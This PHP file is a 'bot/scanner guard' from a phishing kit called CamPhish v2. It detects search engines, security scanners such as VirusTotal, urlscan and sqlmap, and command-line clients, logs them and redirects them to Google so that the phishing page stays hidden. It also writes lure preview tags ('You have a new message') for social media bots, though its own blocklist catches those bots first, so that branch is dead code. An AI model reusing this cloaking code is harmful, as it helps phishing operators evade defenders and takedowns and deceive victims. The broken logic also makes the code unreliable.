<?php
// CamPhish v2 - Bot/Scanner Guard
// Blocks known bots, crawlers, and security scanners
// Include this at the top of template.php

$blocked = false;
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
$remoteIP = $_SERVER['REMOTE_ADDR'];

// Known bot User-Agent patterns
$botPatterns = [
    // Search engines
    'googlebot', 'bingbot', 'yahoo', 'yandex', 'baiduspider', 'duckduckbot',
    'slurp', 'msnbot', 'teoma', 'ia_archiver',
    
    // Security scanners
    'virustotal', 'urlscan', 'shodan', 'censys', 'nmap',
    'nikto', 'sqlmap', 'nessus', 'openvas', 'w3af',
    'acunetix', 'burpsuite', 'zap', 'arachni', 'skipfish',
    
    // Web crawlers
    'curl', 'wget', 'python-requests', 'python-urllib', 'java/',
    'libwww', 'lwp-trivial', 'httpunit', 'nutch', 'phpcrawl',
    'scrapy', 'phantomjs', 'headlesschrome',
    
    // Social media bots (preview fetchers)
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'slackbot',
    'telegrambot', 'whatsapp', 'discordbot',
    
    // Other bots
    'bot', 'spider', 'crawl', 'fetch', 'scan', 'check',
    'monitor', 'archive', 'semrush', 'ahrefs', 'majestic',
    'mj12bot', 'dotbot', 'rogerbot', 'seznambot'
];

// Check User-Agent against patterns
foreach ($botPatterns as $pattern) {
    if (strpos($userAgent, $pattern) !== false) {
        $blocked = true;
        break;
    }
}

// Block empty User-Agents (likely automated)
if (empty($userAgent)) {
    $blocked = true;
}

// Block if no Accept header (bots often skip this)
if (!isset($_SERVER['HTTP_ACCEPT']) || empty($_SERVER['HTTP_ACCEPT'])) {
    $blocked = true;
}

// Log blocked attempt
if ($blocked) {
    $logEntry = date('Y-m-d H:i:s') . " | BLOCKED | IP: " . $remoteIP . " | UA: " . $userAgent . "\n";
    file_put_contents('blocked.log', $logEntry, FILE_APPEND);
    
    // Redirect to Google (looks innocent)
    header('HTTP/1.1 302 Found');
    header('Location: https://www.google.com');
    exit();
}

// Allow social media bots to see OG tags for previews
// but don't serve the actual page
$socialBots = ['facebookexternalhit', 'twitterbot', 'linkedinbot', 'slackbot', 'whatsapp'];
$isSocialBot = false;
foreach ($socialBots as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        $isSocialBot = true;
        break;
    }
}

// If social bot, serve just the OG tags
if ($isSocialBot) {
    echo '<!DOCTYPE html><html><head>';
    echo '<meta property="og:title" content="You have a new message">';
    echo '<meta property="og:description" content="Click to view your message">';
    echo '<meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/134/134914.png">';
    echo '</head><body>Redirecting...</body></html>';
    exit();
}
?>
